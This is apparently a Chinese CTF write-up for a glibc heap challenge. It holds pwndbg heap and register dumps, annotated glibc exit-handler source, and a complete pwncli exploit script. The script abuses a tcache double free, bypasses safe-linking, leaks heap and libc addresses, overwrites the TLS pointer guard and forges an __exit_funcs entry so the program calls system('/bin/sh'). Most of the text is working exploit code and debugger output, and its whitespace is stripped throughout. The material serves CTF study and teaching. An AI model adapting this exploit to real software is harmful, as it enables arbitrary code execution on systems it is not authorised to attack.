0x5643909ab380 0x0000000000000000 0x0000000000000061 ........a.......0x5643909ab390 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3a0 0x00000005643909ab 0x00000005643909ab ..9d......9d.... <-- tcachebins[0x60][2/3]0x5643909ab3b0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3c0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3d0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3e0 0x00000005643909ab 0x0000000000000061 ..9d....a..........0x5643909ab630 0x00005646f4a3ba0b 0x4343434343434343 ....FV..CCCCCCCC <-- tcachebins[0x60][1/3]0x5643909ab640 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab650 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab660 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab670 0x4343434343434343 0x4343434343434343 CCCCCCCCCCCCCCCC0x5643909ab680 0x4343434343434343 0x0000000000000061 CCCCCCCCa.......0x5643909ab690 0x00005646f4a3bf9b 0x3440601815321279 ....FV..y.2..`@4 <-- tcachebins[0x60][0/3]0x5643909ab6a0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6b0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6c0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6d0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6e0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab6f0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab700 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab710 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab720 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab730 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab7a0 0x4141414141414141 0x000000000001f861 AAAAAAAAa....... <-- Top chunk
pwndbg>binstcachebins0x60[ 3]:
0x5643909ab690—▸0x5643909ab630—▸0x5643909ab3a0◂—00x110[ 1]:
0x5643909aa680◂—00x160[ 1]:
0x5643909aa520◂—0fastbinsemptyunsortedbinempty
foriinrange(11):
add(i,b"A"*0x58)for i inrange(7):
dele(i)dele(7)dele(8)dele(7)for i inrange(6,-1,-1):
add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)
0x55dc3ef75380 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef75390 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef753a0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753b0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753c0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753d0 0x0000000000000000 0x0000000000000000 ................0x55dc3ef753e0 0x0000000000000000 0x0000000000000061 ........a.......0x55dc3ef753f0 0x0000000000000000 0x00000000000003c1 ................ <-- unsortedbin[all][0]0x55dc3ef75400 0x00007f2b89310d00 0x00007f2b89310d00 ..1.+.....1.+...0x55dc3ef75410 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75420 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75430 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x55dc3ef75440 0x4242424242424242 0x0000000000000061 BBBBBBBBa..........0x55dc3ef75740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x55dc3ef75750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef75790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x55dc3ef757a0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x55dc3ef757b0 0x00000000000003c0 0x0000000000000050 ........P.......0x55dc3ef757c0 0x0000000000000000 0x0000000000000041 ........A.......0x55dc3ef757d0 0x0000000000000000 0x0000000000000031 ........1.......0x55dc3ef757e0 0x0000000000000000 0x0000000000000021 ........!.......0x55dc3ef757f0 0x0000000000000000 0x0000000000000011 ................0x55dc3ef75800 0x0000000000000000 0x000000000001f801 ................ <--Topchunk
foriinrange(11):
add(i,b"A"*0x58)foriinrange(7): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1):
add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)
# """# overwrite tcachebin size to unsortedbin size
# """add(8,b"D"*0x58)add(7,b"E"*0x58)add(10,b"a"*0x58)dele(9)add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)dele(0)add(0,pack(0)+pack(0x421)+b"q"*0x48)add(9,pack(0)+pack(0x51)+pack(0)+pack(0x41)+pack(0)+pack(0x31)+pack(0)+pack(0x21)+pack(0)+pack(0x11)+pack(0))dele(10)show(10)ru(b"burgir[10]: ")libc_leak=r(8)libc_leak=u64(libc_leak)success(f"libc_leak = {hex(libc_leak)}")libc.address=libc_leak-0x1d3d00success(f"libc.address = {hex(libc.address)}") add(10,pack(0)*9+pack(0x61)+pack(0))
pwndbg>binstcachebins0x110[ 1]:
0x55dc3ef74680◂—00x160[ 1]:
0x55dc3ef74520◂—0fastbinsemptyunsortedbinall:
0x55dc3ef753f0—▸0x7f2b89310d00(main_arena+96) ◂—0x55dc3ef753f0smallbinsemptylargebinsempty
while(true) {structexit_function_list*cur = *listp;if(cur ==NULL) { __exit_funcs_done =true;break; }while(cur->idx >0) {structexit_function*f = &cur->fns[--cur->idx];switch(f->flavor) {caseef_on: // on_exit函数caseef_at: // atexit函数 caseef_cxa: // C++析构函数// 执行函数... } }// 释放当前块，移动到下一个块 *listp = cur->next;if(*listp !=NULL)free(cur);}
structexit_function_list*__exit_funcs = &initial;
structexit_function_list{structexit_function_list*next; // 链表指针size_tidx; // 当前使用的索引structexit_functionfns[32]; // 函数数组（每个块32个函数）};structexit_function{longintflavor; // 函数类型标识union{void(*at) (void); // atexit函数指针struct{void(*fn) (intstatus,void*arg); // on_exit函数指针void*arg; // 用户参数 } on;struct{void(*fn) (void*arg,intstatus); // __cxa_atexit函数指针void*arg; // 用户参数void*dso_handle; // DSO句柄 } cxa; } func;};
case ef_cxa: // __cxa_atexit注册的函数（C++析构函数）/* To avoid dlclose/exit race calling cxafct twice (BZ 22180), we must mark this function as ef_free. *//* 为了避免dlclose/exit竞争条件导致cxafct被调用两次(BZ 22180)， 我们必须将此函数标记为ef_free */ f->flavor = ef_free; cxafct = f->func.cxa.fn; arg = f->func.cxa.arg;PTR_DEMANGLE(cxafct); // 解密函数指针/* Unlock the list while we call a foreign function. *//* 在调用外部函数时解锁列表 */ __libc_lock_unlock (__exit_funcs_lock);cxafct(arg, status); // 【PWN关键点】调用C++析构函数 __libc_lock_lock (__exit_funcs_lock);break;
    #definePTR_MANGLE(var) (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)#definePTR_DEMANGLE(var) PTR_MANGLE (var)
0x7f4524b32f60<__run_exit_handlers+336> mov rcx, qword ptr [rax+0x18] RCX, [initial+24]=>0xfe8a4968348000000x7f4524b32f64<__run_exit_handlers+340> mov r8, qword ptr [rax+0x20] R8, [initial+32]=>0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */►0x7f4524b32f68<__run_exit_handlers+344> mov qword ptr [rax+0x10],0 [initial+16]<=00x7f4524b32f70<__run_exit_handlers+352> mov rax, rcx RAX=>0xfe8a4968348000000x7f4524b32f73<__run_exit_handlers+355> mov ecx, r12d ECX=>00x7f4524b32f76<__run_exit_handlers+358> ror rax,0x110x7f4524b32f7a<__run_exit_handlers+362> xor rax, qword ptr fs:[0x30] RAX=>0x7f4524b41a40(system) (0x7f4524b41a40^0x0
structexit_function_list{structexit_function_list*next; // 设置为0size_tidx; // 设置为1structexit_functionfns[32]; // 填充一个结构体，按照cxa去填充};structexit_function{ // cxa的结构体longintflavor; // 4void(*fn) (void*arg,intstatus); // 函数指针void*arg; // 参数指针void*dso_handle; // 随便设置};
pwndbg> tele 0x7f4524af278000:
0000│ fs_base 0x7f4524af2780 ◂— 0x7f4524af278001:
0008│ 0x7f4524af2788 —▸ 0x7f4524af3120 ◂— 102:
0010│ 0x7f4524af2790 —▸ 0x7f4524af2780 ◂— 0x7f4524af278003:
0018│ 0x7f4524af2798 ◂— 004:
0020│ 0x7f4524af27a0 ◂— 005:
0028│ 0x7f4524af27a8 ◂— 0xa9379609e4922e0006:
0030│ 0x7f4524af27b0 ◂— 007:
0038│ 0x7f4524af27b8 ◂— 0
pwndbg>binstcachebins0x60[ 0]:
0x33ea2de158f42a180x110[ 1]:
0x55a07ae54680◂—00x160[ 1]:
0x55a07ae54520◂—0
pwndbg>tele&initial00:
0000│ rax r150x7f4524cca1e0(initial) ◂—001:
0008│ 0x7f4524cca1e8(initial+8) ◂—002:
0010│ 0x7f4524cca1f0(initial+16) ◂—403:
0018│ 0x7f4524cca1f8(initial+24) ◂—0xfe8a49683480000004:
0020│ 0x7f4524cca200(initial+32) —▸0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */05:
0028│ 0x7f4524cca208(initial+40) ◂—'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
►0x7f4524b32f94<__run_exit_handlers+388>call rax <system> command:
0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */
#!/usr/bin/env python3frompwncliimport*cli_script()set_remote_libc('libc.so.6')io: tube = gift.ioelf: ELF = gift.elflibc: ELF =gift.libcdefpack_data():
returnbytes([10,0xf0,0x0f,4]) +bytes([0,0xf0,0x0f,4])data = flat({# header check0:
bytes([0x53,0x80,0xF6,0x34]),0x58:b"PICT",0x5c:
p16(0x5500), # width big endian0x5e:
p16(0x100), # height big endian0x68:
bytes([0,8,0,0xf0]),# header info0x6c:
pack_data()*0x40},filler=b"x00")sz =len(data)ru(b"Enter image size in bytes: ")sl(str(sz).encode())sl(data)ru(b"yo face = ")num = rl()[:-1]success(f"num ={num}/ 4919")defcmd(i, prompt=b">> "): sla(prompt, i)defadd(idx, data): cmd('1') sla(b"order: ",str(idx).encode()) sla(b"describe ", data)#......defdele(idx): cmd('2') sla(b"throw? D: ",str(idx).encode())#......defshow(idx): cmd('31') sla(b"food where: ",str(idx).encode())#......add(0,b"A"*0x58)dele(0)show(0)ru(b"burgir[0]: ")heap_leak = r(8)heap_leak = u64(heap_leak)success(f"heap_leak ={hex(heap_leak)}")heap_base = (heap_leak <<12)-0x1000foriinrange(11): add(i,b"A"*0x58)foriinrange(7): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1): add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)add(8,b"D"*0x58)add(7,b"E"*0x58)add(10,b"a"*0x58)dele(9)add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)dele(0)add(0,pack(0)+pack(0x421)+b"q"*0x48)add(9,pack(0)+pack(0x51) + pack(0) + pack(0x41) + pack(0)+ pack(0x31) + pack(0) + pack(0x21) + pack(0) + pack(0x11) + pack(0))dele(10)show(10)ru(b"burgir[10]: ")libc_leak = r(8)libc_leak = u64(libc_leak)success(f"libc_leak ={hex(libc_leak)}")libc.address = libc_leak - 0x1d3d00success(f"libc.address ={hex(libc.address)}") add(10,pack(0)*9+ pack(0x61) + pack(0))foriinrange(1,8,1): dele(i)dele(8)dele(9)dele(8)foriinrange(7,0,-1): add(i,b"B"*0x58)tls = libc.address -0x2880pg =0add(8,pack((tls+0x30)^((heap_base+0x1700)>>12))+b"C"*0x50)add(9,b"x"*0x30+pack(0x3f0)+pack(0x20)+pack(0)*3)add(8,b"x"*0x58)add(0,pack(0)+b"x00"*0x50)dele(1)add(1,pack(0)+pack(0x3f1)+pack(libc_leak)*2+pack(0)*7)foriinrange(0,9): add(i,b"A"*0x48)foriinrange(6,-1,-1): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1): add(i,b"D"*0x48)add(7,pack((libc.sym.initial)^((heap_base+0x1620)>>12))+pack(0)*8)add(8,b"x"*0x48)add(7,b"x"*0x48)system = libc.sym.systembinsh =next(libc.search(b"/bin/shx00") )success(f"binsh ={hex(binsh)}")add(9,pack(0)+pack(1)+pack(4)+pack(system<<0x11)+pack(binsh)+b"x"*0x20)cmd(b"balabala")ia()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179927-wxsync-2025-10-4712783a98066b52a45928c9c6bb08b8.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179932-wxsync-2025-10-71612baea187590d75a96ee2368782fc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179933-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179935-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179937-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760179938-wxsync-2025-10-f3a6e530b80ade00f97deed30f426eb6.gif)